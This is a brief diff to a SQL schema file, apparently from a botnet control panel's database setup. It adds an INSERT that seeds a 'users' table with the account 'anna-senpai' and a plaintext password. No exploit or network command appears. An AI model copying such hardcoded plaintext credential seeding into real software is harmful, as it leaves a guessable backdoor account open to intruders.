@@ -36,3 +36,5 @@ CREATE TABLE `whitelist` (
   PRIMARY KEY (`id`),
   KEY `prefix` (`prefix`)
 );
+
+INSERT INTO users VALUES (NULL, 'anna-senpai', 'myawesomepassword', 0, 0, 0, 0, -1, 1, 30, '');
